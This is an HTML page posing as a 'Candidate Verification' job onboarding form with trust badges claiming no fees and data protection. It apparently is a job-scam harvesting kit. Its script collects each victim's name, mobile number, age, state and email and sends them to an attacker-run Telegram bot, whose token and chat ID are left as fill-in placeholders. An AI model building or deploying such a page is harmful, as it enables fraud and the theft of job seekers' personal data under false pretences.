<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Candidate Verification</title>

<style>
*{
  box-sizing:border-box;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  -webkit-tap-highlight-color:transparent;
}
body{
  margin:0;
  min-height:100vh;
  background:linear-gradient(180deg,#0a1d44,#020814);
  display:flex;
  justify-content:center;
  align-items:flex-start;
  padding:18px;
  color:#fff;
}
.card{
  width:100%;
  max-width:420px;
  background:linear-gradient(180deg,#071634,#020814);
  border-radius:26px;
  padding:22px;
  box-shadow:0 28px 65px rgba(0,0,0,.6);
}
h1{
  font-size:24px;
  text-align:center;
  margin-bottom:6px;
}
.sub{
  font-size:13px;
  text-align:center;
  opacity:.75;
  margin-bottom:18px;
}
.badge{
  background:#0f3b2a;
  color:#36ffb0;
  text-align:center;
  padding:12px;
  border-radius:16px;
  font-size:13px;
  margin-bottom:22px;
}
label{
  font-size:13px;
  opacity:.85;
  margin-bottom:6px;
  display:block;
}
input{
  width:100%;
  padding:16px;
  border:none;
  border-radius:18px;
  background:#44474d;
  color:#fff;
  font-size:16px;
  margin-bottom:18px;
}
input::placeholder{
  color:#c5c8cf;
}
button{
  width:100%;
  padding:18px;
  border:none;
  border-radius:22px;
  background:linear-gradient(135deg,#1e63ff,#2f8bff);
  color:#fff;
  font-size:16px;
  font-weight:600;
  cursor:pointer;
  box-shadow:0 10px 30px rgba(30,99,255,.45);
}
button:active{transform:scale(.97)}
.footer{
  text-align:center;
  font-size:11px;
  opacity:.6;
  margin-top:18px;
}
</style>
</head>

<body>

<div class="card">
  <h1>Candidate Verification</h1>
  <div class="sub">Secure onboarding & eligibility validation</div>

  <div class="badge">
    ‚úì No Fees &nbsp; ‚Ä¢ &nbsp; ‚úì No Investment &nbsp; ‚Ä¢ &nbsp; ‚úì 100% Transparent
  </div>

  <form id="jobForm">
    <label>Full Name</label>
    <input name="name" placeholder="Enter your full name" required>

    <label>Mobile Number</label>
    <input name="mobile" placeholder="10-digit mobile number" inputmode="numeric" required>

    <label>Age</label>
    <input name="age" placeholder="Must be 18+" inputmode="numeric" required>

    <label>State</label>
    <input name="state" placeholder="Your state of residence" required>

    <label>Email Address</label>
    <input name="email" type="email" placeholder="you@example.com" required>

    <button type="submit">Submit & Continue Verification</button>
  </form>

  <div class="footer">
    üîí Secure Processing ‚Ä¢ Data Protected
  </div>
</div>

<script>
/* üî¥ TELEGRAM CONFIG (REPLACE THESE) */
const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
const CHAT_ID   = "PASTE_YOUR_CHAT_ID_HERE";

document.getElementById("jobForm").addEventListener("submit", function(e){
  e.preventDefault();

  const btn = this.querySelector("button");
  btn.disabled = true;
  btn.innerText = "Submitting...";

  const f = e.target;

  const message = `
üÜï *New Candidate Verification*

üë§ Name: ${f.name.value}
üì± Mobile: ${f.mobile.value}
üéÇ Age: ${f.age.value}
üìç State: ${f.state.value}
üìß Email: ${f.email.value}

üïí ${new Date().toLocaleString()}
`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    })
  })
  .then(() => {
    alert("‚úÖ Details submitted successfully");
    btn.innerText = "Submitted";
  })
  .catch(() => {
    alert("‚ùå Failed to submit. Try again.");
    btn.disabled = false;
    btn.innerText = "Submit & Continue Verification";
  });
});
</script>

</body>
</html>
